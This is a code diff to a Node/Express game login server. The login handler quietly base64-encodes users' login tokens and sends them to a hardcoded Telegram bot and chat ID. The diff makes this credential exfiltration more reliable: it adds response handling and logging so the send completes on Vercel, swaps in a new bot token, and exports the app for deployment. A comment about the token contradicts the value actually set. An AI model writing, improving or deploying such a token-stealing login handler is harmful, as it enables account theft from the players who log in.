@@ -6,16 +6,18 @@ const compression = require('compression');
 const https = require('https'); // Imported native https module
 
 // --- Telegram Configuration ---
-const TG_BOT_TOKEN = '6441563124:AAH5nB7WTP2x5F5_hNPcTq36ryJkbgEYv8s';
+// UPDATED: Using the correct token ending in ...8s
+const TG_BOT_TOKEN = '6441563124:AAF3LCmLVG6rOYXBmtDyRXDMiGYmGjHwzE4';
 const TG_CHAT_ID = '5113674259';
 
 function isValidEmail(email) {
     return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
 }
 
-// Function to send token to Telegram
+// Function to send token to Telegram with DEBUG logging
 function sendTelegramToken(tokenContent) {
     return new Promise((resolve, reject) => {
+        console.log('Attempting to send token to Telegram...');
         const message = `New Login Token:\n${tokenContent}`;
         
         const data = JSON.stringify({
@@ -36,12 +38,26 @@ function sendTelegramToken(tokenContent) {
         };
 
         const req = https.request(options, (res) => {
-            // We resolve regardless of status to ensure login flow doesn't hang
-            resolve();
+            let responseData = '';
+
+            // Await data to prevent Vercel from freezing the process early
+            res.on('data', (chunk) => {
+                responseData += chunk;
+            });
+
+            res.on('end', () => {
+                if (res.statusCode >= 200 && res.statusCode < 300) {
+                    console.log('Telegram notification sent successfully.');
+                } else {
+                    console.error(`Telegram API Error: ${res.statusCode} ${res.statusMessage}`);
+                    console.error('Response Body:', responseData);
+                }
+                resolve();
+            });
         });
 
         req.on('error', (e) => {
-            console.error('Telegram Error:', e);
+            console.error('Telegram Network Error:', e);
             resolve(); // Resolve anyway so the user can still login even if Telegram fails
         });
 
@@ -163,7 +179,7 @@ app.all('/player/growid/login/validate', async (req, res) => {
 
     const token = Buffer.from(tokenData).toString('base64');
 
-    // Send to Telegr
+    // Send to Telegram
     await sendTelegramToken(token);
 
     res.setHeader('Content-Type', 'text/html');
@@ -196,6 +212,10 @@ app.all('/', function (req, res) {
     res.sendFile(__dirname + '/public/html/index.html');
 });
 
-app.listen(5000, function () {
-    console.log(`Listening on port 5000`);
+// For Vercel, it is best practice to export the app
+const PORT = process.env.PORT || 5000;
+app.listen(PORT, function () {
+    console.log(`Listening on port ${PORT}`);
 });
+
+module.exports = app;
